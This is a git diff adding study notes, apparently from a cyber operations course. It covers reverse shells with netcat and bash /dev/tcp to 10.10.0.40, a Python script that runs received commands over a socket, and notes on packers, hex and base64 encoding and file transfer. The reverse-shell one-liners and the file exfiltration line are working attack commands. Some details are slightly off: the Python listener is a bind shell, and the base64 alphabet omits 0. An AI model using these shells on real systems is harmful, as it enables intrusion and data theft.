@@ -406,3 +406,141 @@ On the sending box:
 	$ cat secret.txt > /dev/tcp/10.10.0.40/1111
 
 This method is useful for a host that does not have NETCAT available.
+
+
+# REVERSE SHELLS
+
+## REVERSE SHELL USING NETCAT
+First listen for the shell on your device.
+
+	$ nc -lvp 9999
+
+On Victim using -c :
+
+	$ nc -c /bin/bash 10.10.0.40 9999
+
+On Victim using -e :
+
+	$ nc -e /bin/bash 10.10.0.40 9999
+
+## REVERSE SHELL USING /DEV/TCP
+First listen for the shell on your device.
+
+	$ nc -lvp 9999
+
+On Victim:
+
+	$ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
+
+## REVERSE SHELL PYTHON3
+
+```
+#!/usr/bin/python3
+import socket
+import subprocess
+PORT = 1234        # Choose an unused port
+print ("Waiting for Remote connections on port:", PORT, "\n")
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(('', PORT))
+server.listen()
+while True:
+    conn, addr = server.accept()
+    with conn:
+        print('Connected by', addr)
+        while True:
+            data = conn.recv(1024).decode()
+            if not data:
+                break
+            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, err = proc.communicate()
+            response = output.decode() + err.decode()
+            conn.sendall(response.encode())
+server.close()
+ ```
+ 
+# UNDERSTANDING PACKING AND ENCODING
+Discuss the purpose of packers
+
+Perform Hexadecimal encoding and decoding
+
+Demonstrate Base64 encoding and decoding
+
+Conduct file transfers with Base64
+
+## PACKERS
+Special code added to programs to compress executables
+
+Reduces network traffic
+
+Used for obfuscation
+
+Reduces time on target
+
+Example: UPX
+
+## ENCODING AND DECODING
+Specialized formatting
+
+Used for transmission and storage
+
+Hex and Base64 are the most common
+
+NOT Compression
+
+NOT Encapsulation
+
+NOT Encryption
+
+## HEXADECIMAL ENCODING AND DECODING
+Converts the binary representation of a data set to the 2 digit base-16 equivalent.
+
+Used by IPv6 and MAC addresses
+
+Color schemes
+
+Increases readability and information density
+
+## XXD EXAMPLE
+echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\
+
+	$ echo "Hex encoding test" | xxd -p 48657820656e636f64696e6720746573740a
+
+echo hex string and use xxd to restore the data to its original format
+
+	$ echo "48657820656e636f64696e6720746573740a" | xxd -r -p Hex encoding test
+
+ ## BASE64 ENCODING AND DECODING
+binary-to-text encoding
+
+A-Z, a-z, 1-9, +, /
+
+6 bits per non-final digit
+
+(4) 6-bit groups per (3) 8-bit groups
+
+padding used to fill in any unused space in each 24-bit group
+
+## BASE64 CONVERSION CHART
+
+![base64chart](https://github.com/user-attachments/assets/142ee284-e1c0-45fd-a262-a78924551732)
+
+## ASCII TO BASE64 CONVERSION EXAMPLE
+￼
+![asciitobase64conversion](https://github.com/user-attachments/assets/68dac678-80ef-4d7d-8496-6fb4485e1f36)
+
+## TRANSFER FILE WITH BASE64
+generate the base64 output of a file, with line wrapping removed
+
+	$ base64 -w0 logoCyber.png
+ 
+copy the output
+
+create a new file on your machine
+
+	$ nano b64image.png
+
+	paste, save & exit
+decode from base64 with -d
+
+	$ base64 -d b64image.png > logoCyber.png
+ 
